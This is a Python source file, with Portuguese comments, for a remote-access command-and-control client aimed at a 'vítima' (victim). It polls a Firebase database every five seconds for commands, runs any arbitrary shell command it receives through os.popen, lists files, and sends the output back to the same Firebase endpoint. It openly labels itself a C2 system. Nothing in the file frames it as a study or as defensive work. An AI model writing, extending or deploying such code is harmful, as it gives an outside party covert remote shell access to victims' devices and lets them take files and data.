import tkinter as tk
from tkinter import ttk
import requests
import os
import time
import json

# Firebase
firebase_url = "https://vibe-chat-b1e67-default-rtdb.firebaseio.com"
vitima_id = os.environ.get("USER", "vitima_kira")  # Nome da vítima

def buscar_comando():
    try:
        response = requests.get(f"{firebase_url}/comandos/{vitima_id}.json")
        if response.status_code == 200 and response.text != "null":
            comando = response.json()
            executar_comando(comando)
    except Exception as e:
        print("Erro ao buscar comando:", e)

def executar_comando(comando):
    if not comando:
        return
    categoria = comando.get("categoria")
    acao = comando.get("acao")

    # Exemplo de comandos por categoria
    if categoria == "sistema":
        if acao == "listar_arquivos":
            arquivos = os.listdir(".")
            resposta = "\n".join(arquivos)
        elif acao == "info_usuario":
            resposta = f"Usuário: {vitima_id}"
        else:
            resposta = "Comando desconhecido"
    elif categoria == "mensagem":
        if acao == "alerta":
            os.system("termux-toast '⚠️ ALERTA RECEBIDO DO PAINEL'")
            resposta = "Alerta exibido"
        elif acao == "popup":
            os.system("termux-dialog --title 'Comando' --text 'Você recebeu um aviso.'")
            resposta = "Popup exibido"
        else:
            resposta = "Comando desconhecido"
    elif categoria == "shell":
        if acao.startswith("cmd:"):
            try:
                saida = os.popen(acao[4:]).read()
                resposta = saida or "Comando executado"
            except Exception as e:
                resposta = f"Erro: {str(e)}"
        else:
            resposta = "Shell inválido"
    else:
        resposta = "Categoria inválida"

    # Enviar resultado para Firebase
    requests.put(f"{firebase_url}/respostas/{vitima_id}.json", json.dumps({"resposta": resposta}))

def atualizar_comandos():
    buscar_comando()
    root.after(5000, atualizar_comandos)  # A cada 5 segundos

def mostrar_interface():
    root = tk.Tk()
    root.title(f"[VÍTIMA] Conectada como {vitima_id}")
    root.geometry("700x400")
    root.configure(bg="black")

    label = tk.Label(root, text="💀 Sistema C2 - Escutando comandos...", fg="lime", bg="black", font=("Consolas", 14))
    label.pack(pady=10)

    categoria_label = tk.Label(root, text="Categorias disponíveis:", fg="white", bg="black")
    categoria_label.pack()

    categorias = {
        "sistema": ["listar_arquivos", "info_usuario"],
        "mensagem": ["alerta", "popup"],
        "shell": ["cmd:ls", "cmd:whoami", "cmd:date"]
        # Aqui você pode adicionar 15 categorias com até 15 comandos
    }

    tree = ttk.Treeview(root)
    tree["columns"] = ("Comandos")
    tree.heading("#0", text="Categoria")
    tree.heading("Comandos", text="Comandos")
    tree.column("Comandos", width=400)

    for cat, cmds in categorias.items():
        node = tree.insert("", "end", text=cat)
        for cmd in cmds:
            tree.insert(node, "end", text="", values=(cmd))

    tree.pack(expand=True, fill="both")

    root.after(5000, atualizar_comandos)
    root.mainloop()

if __name__ == "__main__":
    root = tk.Tk()
    root.withdraw()
    mostrar_interface()
